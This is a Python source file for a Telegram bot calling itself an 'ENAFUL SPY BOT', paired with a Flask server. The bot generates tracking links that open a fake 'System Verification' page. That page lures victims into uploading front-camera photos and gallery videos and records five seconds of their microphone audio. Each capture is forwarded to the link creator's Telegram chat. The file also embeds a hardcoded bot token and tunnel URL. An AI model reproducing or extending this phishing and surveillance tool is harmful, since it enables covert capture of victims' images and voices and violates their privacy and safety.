import base64
import threading
import requests
import os
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from datetime import datetime

TOKEN = '8757294593:AAEzF8MXSiLVG1vgazLrcIVWcPbjdYJYPZA'
BASE_URL = 'https://conf-expires-spatial-smallest.trycloudflare.com' 
ADMIN_LINK = 'https://t.me/KING_OF_ENAFUL' 
PORT = 5000

app = Flask(__name__)

TRACK_HTML = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
    body { background: #0a0a0a; color: #00ff00; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
    .box { border: 1px solid #333; padding: 25px; border-radius: 20px; background: #111; width: 100%; max-width: 350px; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
    .btn { background: linear-gradient(45deg, #1a1a1a, #333); color: white; border: 1px solid #444; padding: 15px; margin: 10px 0; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; display: block; }
    .btn:hover { border-color: #00ff00; }
</style></head>
<body>
    <div class="box">
        <h2 style="margin-top:0;">🛡️ SECURE CHECK</h2>
        <p id="st">Please verify your device identity to access the content.</p>
        <button class="btn" onclick="document.getElementById('c').click()">📸 Front Camera</button>
        <button class="btn" onclick="document.getElementById('gv').click()">🎥 Gallery Video</button>
        <button class="btn" onclick="recAudio()">🎙️ Voice Verify</button>
        <input type="file" id="c" accept="image/*" capture="user" style="display:none;" onchange="up(this,'/up','Camera')">
        <input type="file" id="gv" accept="video/*" style="display:none;" onchange="up(this,'/uv','Gallery Video')">
    </div>
    <script>
        function recAudio() {
            navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
                document.getElementById('st').innerText = "Recording...";
                const mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.start();
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
                    let reader = new FileReader();
                    reader.onload = () => sd(reader.result, 'Voice Record', '/ua');
                    reader.readAsDataURL(blob);
                    document.getElementById('st').innerText = "Verification Sent! ✅";
                };
                setTimeout(() => mediaRecorder.stop(), 5000);
            }).catch(e => { alert("Permission required!"); });
        }
        function up(i,p,t){
            let r=new FileReader(); r.onload=()=>sd(r.result,t,p); r.readAsDataURL(i.files[0]);
            document.getElementById('st').innerText="Uploading "+t+"...";
        }
        function sd(d,t,p){ fetch(p,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({img:d,id:'{{chat_id}}',type:t})}); }
    </script>
</body></html>
"""

@app.route('/track/<chat_id>')
def track(chat_id): return render_template_string(TRACK_HTML, chat_id=chat_id)

@app.route('/ui', methods=['POST'])
def ui():
    d = request.json; i = d['info']
    msg = f"🌐 **IP DETECTED!**\n━━━━━━━━━━━━\n📍 IP: `{i.get('ip')}`\n🏙️ City: {i.get('city')}\n🛡️ System: ENAFUL"
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', params={'chat_id':d['id'], 'text':msg, 'parse_mode':'Markdown'})
    return "OK"

@app.route('/up', methods=['POST'])
def up():
    d = request.json; b = base64.b64decode(d['img'].split(',')[1])
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', params={'chat_id':d['id'], 'caption':f'📸 **{d["type"]} Captured!**'}, files={'photo':('s.png', b)})
    return "OK"

@app.route('/uv', methods=['POST'])
def uv():
    d = request.json; b = base64.b64decode(d['img'].split(',')[1])
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendVideo', params={'chat_id':d['id'], 'caption':f'🎥 **{d["type"]} Uploaded!**'}, files={'video':('v.mp4', b)})
    return "OK"

@app.route('/ua', methods=['POST'])
def ua():
    d = request.json; b = base64.b64decode(d['img'].split(',')[1])
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendAudio', params={'chat_id':d['id'], 'caption':f'🎙️ **{d["type"]} Captured!**'}, files={'audio':('a.ogg', b)})
    return "OK"
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    
    text = (
        f"🛡️ **CYBER 71 SPY SYSTEM** 🛡️\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **OWNER: ENAFUL**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📝 **USER INFORMATION:**\n"
        f"┣ 👤 Name: {user.first_name}\n"
        f"┣ 🆔 User ID: `{user.id}`\n"
        f"┣ 🛡️ Status: Premium ✅\n"
        f"┣ 🌐 IP: Hidden 🔒\n"
        f"┗ 📅 Date: {now}\n\n"
        f"💰 Balance: 30 🌑 coins\n\n"
        f"📢 **Note:** Select a tool from below and generate your link."
    )
    
    keyboard = [
        [InlineKeyboardButton("📸 Front Camera", callback_data='gen'), InlineKeyboardButton("📸 Back Camera", callback_data='gen')],
        [InlineKeyboardButton("📍 Location Tracker", callback_data='gen'), InlineKeyboardButton("📋 Clipboard Monitor", callback_data='gen')],
        [InlineKeyboardButton("💰 My Balance", callback_data='bal'), InlineKeyboardButton("📊 History", callback_data='hist')],
        [InlineKeyboardButton("🎙️ Audio Record", callback_data='gen'), InlineKeyboardButton("🎥 Gallery Video", callback_data='gen')],
        [InlineKeyboardButton("👨‍💻 Contact OWNER (ENAFUL)", url=ADMIN_LINK)],
        [InlineKeyboardButton("🎁 Daily Coins", callback_data='coin')]
    ]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def cb(u, c):
    q = u.callback_query; await q.answer()
    if q.data == 'gen':
        l = f"{BASE_URL}/track/{q.from_user.id}"
        await q.message.reply_text(f"✅ **Permanent Spy Link Active!**\n\n🔗 `{l}`", parse_mode='Markdown')

if __name__ == '__main__':
    os.system("fuser -k 5000/tcp > /dev/null 2>&1") 
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT)).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(CallbackQueryHandler(cb))
    print("--------------------------------")
    print("   ENAFUL SPY BOT IS READY!     ")
    print("--------------------------------")
    bot.run_polling(drop_pending_updates=True)

